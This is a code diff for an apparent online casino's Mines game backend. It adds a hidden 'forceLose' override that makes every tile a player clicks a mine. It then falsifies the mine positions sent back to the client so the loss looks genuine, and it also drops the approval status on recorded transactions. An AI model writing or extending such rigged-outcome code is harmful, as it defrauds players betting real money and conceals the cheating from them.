@@ -29,7 +29,6 @@ async function recordTx(username, type, bet, payout, balanceAfter, meta) {
     payout,
     profit: payout - bet,
     balanceAfter,
-    status: 'approved', // game transactions are auto-approved
     timestamp: new Date(),
     ...meta
   });
@@ -160,8 +159,7 @@ router.post('/mines/start', async (req, res) => {
       // Admin set exact mine positions
       minePositions.push(...override.slice(0, mines));
     } else if (override === 'lose') {
-      // Force lose: put mine at position 0 so first click hits
-      minePositions.push(0);
+      // forceLose: handled at click time so ANY tile is a mine
       while (minePositions.length < mines) {
         const pos = Math.floor(Math.random() * 25);
         if (!minePositions.includes(pos)) minePositions.push(pos);
@@ -180,7 +178,8 @@ router.post('/mines/start', async (req, res) => {
       betAmount: parseFloat(betAmount),
       minePositions,
       revealed: [],
-      mineCount: mines
+      mineCount: mines,
+      forceLose: override === 'lose'
     };
 
     await user.save();
@@ -196,12 +195,17 @@ router.post('/mines/click', async (req, res) => {
     const game = activeMineGames[req.user.username];
     if (!game) return res.status(400).json({ success: false, message: 'No active game' });
 
-    const isMine = game.minePositions.includes(tileIndex);
+    // forceLose: every tile the user clicks is a mine
+    const isMine = game.forceLose ? true : game.minePositions.includes(tileIndex);
+
     if (isMine) {
+      const minePositions = game.forceLose
+        ? [tileIndex, ...game.minePositions.filter(p => p !== tileIndex)]
+        : game.minePositions;
       const user = await User.findOne({ username: req.user.username });
       await recordTx(req.user.username, 'mines', game.betAmount, 0, user.balance, { revealed: game.revealed, mineHit: tileIndex });
       delete activeMineGames[req.user.username];
-      return res.json({ success: true, data: { isMine: true, minePositions: game.minePositions, win: false, payout: 0 } });
+      return res.json({ success: true, data: { isMine: true, minePositions, win: false, payout: 0 } });
     }
 
     game.revealed.push(tileIndex);
